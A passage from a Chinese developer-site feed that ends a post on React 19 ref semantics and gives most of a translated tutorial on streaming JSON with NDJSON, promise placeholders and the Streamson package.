<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19" target="_blank" title="https://react.dev/blog/2024/12/05/react-19" ref="nofollow noopener noreferrer"><strong>ref as a prop</strong></a>：ref 是组件 API 的一部分（减少 forwardRef 依赖）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F12%2F05%2Freact-19" target="_blank" title="https://react.dev/blog/2024/12/05/react-19" ref="nofollow noopener noreferrer"><strong>ref callback cleanup</strong></a>：ref 生命周期语义更完善，更像 effect cleanup</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2024%2F04%2F25%2Freact-19-upgrade-guide" target="_blank" title="https://react.dev/blog/2024/04/25/react-19-upgrade-guide" ref="nofollow noopener noreferrer"><strong>useRef 类型统一 + 必填初值</strong></a>：停止用 overload 进行语义猜测，统一为可写 RefObject</li>
</ol>
<p>你会得到一个非常清晰的结论：</p>
<blockquote>
<p>React 19 想要的 ref，不再是“React 拥有 / 用户旁观”的所有权模型，<br/>
而是一个在运行时会被多方写入、需要明确生命周期语义的共享槽位（mutable identity）。</p>
</blockquote>
<p>这也解释了为什么 <code>readonly RefObject</code> 最终必须被移除：<br/>
它不是“语义标注”，而是一种会在 ref 合并、透传、工具函数中不断制造摩擦的类型幻觉。</p>
<h2 data-id="heading-12">结语</h2>
<p>现在是 2026 年，React 19 也早就不是新闻了。<br/>
但我还是想写这篇整理，是因为这种“悄无声息的架构修正”往往最容易被忽略。大家会记得 Server Components、Compiler、Actions，却很少有人去回头看：<strong>这些东西成立的前提，是 ref 这种最底层的概念被重新定义过。</strong></p>
<p><code>useRef</code> 变成“所有 ref 都可写”，表面上看是去掉了一个 <code>readonly</code>。<br/>
实际上，它是 React 放弃了一种曾经非常优雅、但已经不再真实的抽象。</p>
<p>我觉得这件事本身，就值得被记住。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端性能革命：200 行 JavaScript 代码实现 Streaming JSON]]></title>    <link>https://juejin.cn/post/7591882877312385076</link>    <guid>https://juejin.cn/post/7591882877312385076</guid>    <pubDate>2026-01-06T09:16:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591882877312385076" data-draft-id="7591882877312286772" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 前端性能革命：200 行 JavaScript 代码实现 Streaming JSON"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-06T09:16:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冴羽"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             前端性能革命：200 行 JavaScript 代码实现 Streaming JSON
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冴羽
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:16:00.000Z" title="Tue Jan 06 2026 09:16:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 前言</h2>
<p>5 月的时候，React 的核心开发者 Dan 发表了一篇名为<a href="https://link.juejin.cn?target=https%3A%2F%2Foverreacted.io%2Fprogressive-json%2F" target="_blank" title="https://overreacted.io/progressive-json/" ref="nofollow noopener noreferrer">《Progressive JSON》</a> 的文章，介绍了一种将 JSON 数据从服务器流式传输到客户端的技术，允许客户端在接收到全部数据之前就开始渲染部分数据。</p>
<p><strong>这可以显著提升用户体验，尤其是处理大型数据集时。</strong></p>
<p>让我们以“获取用户文章”这个场景为例。</p>
<p>这是一个完整的数据结构：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"user"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"John Doe"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"posts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span> <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">101</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"First Post"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span> <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">102</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Second Post"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>假设我们能够很快获取用户信息，但文章数据还需要一段时间从数据库获取。</p>
<p>与其等待数据完全加载完毕，不如先发送一个占位符表示文章字段：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"user"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"John Doe"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"posts"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"_$1"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>客户端收到数据后，先将用户信息渲染出来。</p>
<p>然后，当文章数据准备完毕后，我们将文章数据作为一个单独的 chunk 发送：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"_$1"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">101</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"First Post"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">102</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Second Post"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"..."</span> <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>客户端收到数据后，最后将文章数据渲染出来。</p>
<p>要实现这样一个功能，客户端需要具备处理这些占位符的能力，并在最终数据到达时替换为实际数据。</p>
<p>如果要实现这样一个单独的功能需要多少代码呢？</p>
<p><strong>200 行就可以！</strong></p>
<p>本篇文章和大家介绍下实现思路，供大家学习和思考使用。</p>
<h2 data-id="heading-1">2. 服务端实现</h2>
<p>让我们来看下服务器端实现。</p>
<p>首先是服务端函数。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">serve</span>(<span class="hljs-params">res, data</span>) {
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">"Content-Type"</span>, <span class="hljs-string">"application/x-ndjson; charset=utf-8"</span>);
  res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">"Transfer-Encoding"</span>, <span class="hljs-string">"chunked"</span>);

  <span class="hljs-comment">// 向客户端发送 chunks</span>
  res.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(...) + <span class="hljs-string">"\n"</span>);
  res.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(...) + <span class="hljs-string">"\n"</span>);

  <span class="hljs-comment">// 当完成的时候</span>
  res.<span class="hljs-title function_">end</span>();
}
</code></pre>
<p>这里有 2 点值得注意：</p>
<ol>
<li><strong>我们使用了 <code>application/x-ndjson</code>内容类型。</strong></li>
</ol>
<p>NDJSON，全拼 Newline Delimited JSON，其实就是一种换行符分割的 JSON，其中每一行都是一个有效的 JSON 对象。这允许我们在单个响应中发送多个 JSON 对象，并以换行符分隔。</p>
<ol start="2">
<li><strong>我们使用了 <code>Transfer-Encoding: chunked</code>响应头。</strong></li>
</ol>
<p>使用该响应头，可以通知客户端，响应将分块发送。在调用 <code>res.end()</code>之前，请保持连接活跃状态。</p>
<p>其次，我们需要对数据进行分块。</p>
<p>实现方式也很简单，遍历数据对象，并用占位符替代那些暂时没有准备好的部分。</p>
<p>当遇到需要稍后发送的部分（一个 Promise）时，我们将其存储到队列中，并在准备就绪后，将其作为单独的数据块发送。</p>
<p>函数如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">normalize</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">walk</span>(<span class="hljs-params">node</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isPromise</span>(node)) {
      <span class="hljs-keyword">const</span> id = <span class="hljs-title function_">getId</span>();
      <span class="hljs-title function_">registerPromise</span>(node, id);
      <span class="hljs-keyword">return</span> id;
    }
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(node)) {
      <span class="hljs-keyword">return</span> node.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> <span class="hljs-title function_">walk</span>(item));
    }
    <span class="hljs-keyword">if</span> (node &amp;&amp; <span class="hljs-keyword">typeof</span> node === <span class="hljs-string">"object"</span>) {
      <span class="hljs-keyword">const</span> out = {};
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, val] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(node)) {
        out[key] = <span class="hljs-title function_">walk</span>(val);
      }
      <span class="hljs-keyword">return</span> out;
    }
    <span class="hljs-keyword">return</span> node;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">walk</span>(value);
}
</code></pre>
<p>函数递归遍历数据对象。</p>
<p>当遇到 Promise 时，它会生成一个唯一的占位符 ID，注册该 Promise 以便稍后解析，并返回该占位符。</p>
<p>对于数组和对象，它会递归处理它们的元素或属性。原始值将按原样返回。</p>
<p>这是注册 Promise 的代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> promises = [];

<span class="hljs-keyword">function</span> <span class="hljs-title function_">registerPromise</span>(<span class="hljs-params">promise, id</span>) {
  promises.<span class="hljs-title function_">push</span>({ promise, id });
  promise.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
    <span class="hljs-title function_">send</span>(id, value);
  }).<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"Error resolving promise for path"</span>, err);
    <span class="hljs-title function_">send</span>(id, { <span class="hljs-attr">error</span>: <span class="hljs-string">"promise error"</span>, <span class="hljs-attr">timeoutMs</span>: <span class="hljs-variable constant_">TIMEOUT</span> });
  });
</code></pre>
<p>这是 <code>send</code> 的代码，<code>send</code>函数负责将解析后的数据发送给客户端：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">id, value</span>) {
  res.<span class="hljs-title function_">write</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">i</span>: id, <span class="hljs-attr">c</span>: <span class="hljs-title function_">normalize</span>(value) }) + <span class="hljs-string">"\n"</span>);
  promises = promises.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">p</span>) =&gt;</span> p.<span class="hljs-property">id</span> !== id);
  <span class="hljs-keyword">if</span> (promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) res.<span class="hljs-title function_">end</span>();
}
</code></pre>
<p>该 <code>send</code> 函数会向响应中写入一个新的数据块，其中包括占位符 ID 和 normalize 后的值。然后它会从队列中移除已经 resolve 的 Promise。如果没有其他要处理的 Promise，它就会结束响应，从而关闭与客户端的连接。</p>
<p>完整的实现代码<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkrasimir%2Fstreamson%2Fblob%2Fmain%2Fpackages%2Fstreamson%2Flib%2Fserver.js" target="_blank" title="https://github.com/krasimir/streamson/blob/main/packages/streamson/lib/server.js" ref="nofollow noopener noreferrer">点击这里</a>。</p>
<p>最后，我们举一个从服务端发送的对象示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> data = {
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">"John Doe"</span>,
    <span class="hljs-attr">posts</span>: <span class="hljs-title function_">fetchPostsFromDatabase</span>(), <span class="hljs-comment">// 返回一个 promise</span>
  },
};

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchPostsFromDatabase</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> database.<span class="hljs-title function_">query</span>(<span class="hljs-string">"SELECT * FROM posts WHERE userId = 1"</span>);
  <span class="hljs-keyword">return</span> posts.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">post</span>) =&gt;</span> ({
    <span class="hljs-attr">id</span>: post.<span class="hljs-property">id</span>,
    <span class="hljs-attr">title</span>: post.<span class="hljs-property">title</span>,
    <span class="hljs-attr">content</span>: post.<span class="hljs-property">content</span>,
    <span class="hljs-attr">comments</span>: <span class="hljs-title function_">fetchCommentsForPost</span>(post.<span class="hljs-property">id</span>), <span class="hljs-comment">// 返回一个 promise</span>
  }));
}
</code></pre>
<p>每篇文章还有一个评论字段（comments），该字段是一个 Promise 对象。意味着评论数据将在文章数据发送后，作为单独的片段发送。</p>
<h2 data-id="heading-2">3. 客户端实现</h2>
<p>那客户端该如何实现呢？</p>
<p>在客户端，我们处理传入的数据块，并将占位符替换为实际数据。</p>
<p>我们可以使用 Fetch API 向服务器发送请求，并将响应读取为流。每当遇到占位符时，我们都会将其替换为一个 Promise，该 Promise 将在实际数据到达时解析。</p>
<p>核心逻辑如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint);
    <span class="hljs-keyword">const</span> reader = res.<span class="hljs-property">body</span>.<span class="hljs-title function_">getReader</span>();
    <span class="hljs-keyword">const</span> decoder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextDecoder</span>();

    <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">let</span> done = <span class="hljs-literal">false</span>;
      <span class="hljs-keyword">while</span> (!done) {
        <span class="hljs-keyword">const</span> { value, <span class="hljs-attr">done</span>: readerDone } = <span class="hljs-keyword">await</span> reader.<span class="hljs-title function_">read</span>();
        done = readerDone;
        <span class="hljs-keyword">if</span> (value) {
          <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">const</span> chunk = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(decoder.<span class="hljs-title function_">decode</span>(value, { <span class="hljs-attr">stream</span>: <span class="hljs-literal">true</span> }));
            chunk.<span class="hljs-property">c</span> = <span class="hljs-title function_">walk</span>(chunk.<span class="hljs-property">c</span>);
            <span class="hljs-keyword">if</span> (promises.<span class="hljs-title function_">has</span>(chunk.<span class="hljs-property">i</span>)) {
              promises.<span class="hljs-title function_">get</span>(chunk.<span class="hljs-property">i</span>)(chunk.<span class="hljs-property">c</span>);
              promises.<span class="hljs-title function_">delete</span>(chunk.<span class="hljs-property">i</span>);
            }
          } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error parsing chunk.`</span>, e);
          }
        }
      }
    }
    <span class="hljs-title function_">process</span>();
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Failed to fetch data from Streamson endpoint <span class="hljs-subst">${endpoint}</span>`</span>);
  }
}
</code></pre>
<p>对流的处理，你可能感到陌生，可以拓展阅读我的这篇文章：<a href="https://juejin.cn/post/7344089411983802394" target="_blank" title="https://juejin.cn/post/7344089411983802394">《如何用 Next.js v14 实现一个 Streaming 接口？》</a></p>
<p><code>process</code> 函数逐块读取响应流。每个数据块都被解析为 JSON，并调用 <code>walk</code> 函数将占位符替换为 Promise。</p>
<p>如果数据块包含先前注册的占位符 ID ，则相应的 Promise 会被解析为接收到的数据。关键在于 <code>await reader.read()</code>，它允许我们等待新数据到来。</p>
<p><code>walk</code>函数用于将占位符替换为 Promise：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">walk</span>(<span class="hljs-params">node</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isPromisePlaceholder</span>(node)) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">done</span>) =&gt;</span> {
      promises.<span class="hljs-title function_">set</span>(node, done);
    });
  }
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(node)) {
    <span class="hljs-keyword">return</span> node.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> <span class="hljs-title function_">walk</span>(item));
  }
  <span class="hljs-keyword">if</span> (node &amp;&amp; <span class="hljs-keyword">typeof</span> node === <span class="hljs-string">"object"</span>) {
    <span class="hljs-keyword">const</span> out = {};
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, val] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(node)) {
      out[key] = <span class="hljs-title function_">walk</span>(val);
    }
    <span class="hljs-keyword">return</span> out;
  }
  <span class="hljs-keyword">return</span> node;
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isPromisePlaceholder</span>(<span class="hljs-params">val</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> val === <span class="hljs-string">"string"</span> &amp;&amp; val.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/^_\$(\d)/</span>);
}
</code></pre>
<p>类似于服务端的 <code>normalize</code> 函数。当遇到占位符的时候，它会返回一个新的 Promise，该 Promise 将在实际数据到达时解析。对于数组和对象，它会递归处理它们的元素或属性。原始值则直接返回。当然，ID 必须与服务器端生成的 ID 匹配。</p>
<p>完整的实现代码<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkrasimir%2Fstreamson%2Fblob%2Fmain%2Fpackages%2Fstreamson%2Flib%2Fclient.js" target="_blank" title="https://github.com/krasimir/streamson/blob/main/packages/streamson/lib/client.js" ref="nofollow noopener noreferrer">点击这里</a>。两个文件加起来一共 155 行代码。</p>
<h2 data-id="heading-3">4. NPM 包</h2>
<p>本篇文章整理翻译自 <a href="https://link.juejin.cn?target=https%3A%2F%2Fkrasimirtsonev.com%2Fblog%2Farticle%2Fstreaming-json-in-just-200-lines-of-javascript" target="_blank" title="https://krasimirtsonev.com/blog/article/streaming-json-in-just-200-lines-of-javascript" ref="nofollow noopener noreferrer">Streaming JSON in just 200 lines of JavaScript</a>。</p>
<p>作者还将代码整理成了一个 NPM 包：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkrasimir%2Fstreamson" target="_blank" title="https://github.com/krasimir/streamson" ref="nofollow noopener noreferrer">Streamson</a>。</p>
<p>通过 npm 安装：<code>npm intall streamson</code></p>
<p>服务端上使用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { serve } <span class="hljs-keyword">from</span> <span class="hljs-string">"streamson"</span>;
<span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">"express"</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();
<span class="hljs-keyword">const</span> port = <span class="hljs-number">5009</span>;

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">"/data"</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {
  <span class="hljs-keyword">const</span> myData = {
    <span class="hljs-attr">title</span>: <span class="hljs-string">"My Blog"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"A simple blog example using Streamson"</span>,
    <span class="hljs-attr">posts</span>: <span class="hljs-title function_">getBlogPosts</span>(), <span class="hljs-comment">// this returns a Promise</span>
  };
  <span class="hljs-title function_">serve</span>(res, myData);
});

app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening on port <span class="hljs-subst">${port}</span>`</span>);
});
</code></pre>
<p>客户端是一个 1KB 的 JavaScript 文件，地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Funpkg.com%2Fstreamson%40latest%2Fdist%2Fstreamson.min.js" target="_blank" title="https://unpkg.com/streamson@latest/dist/streamson.min.js" ref="nofollow noopener noreferrer">unpkg.com/streamson@l…</a></p>
<p>客户端使用如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> request = <span class="hljs-title class_">Streamson</span>(<span class="hljs-string">"/data"</span>);

<span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">get</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-property">title</span>); <span class="hljs-comment">// "My Blog"</span>

<span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">get</span>(<span class="hljs-string">"posts"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(posts); <span class="hljs-comment">// Array of blog posts</span>
</code></pre>
<h2 data-id="heading-4">5. 最后</h2>
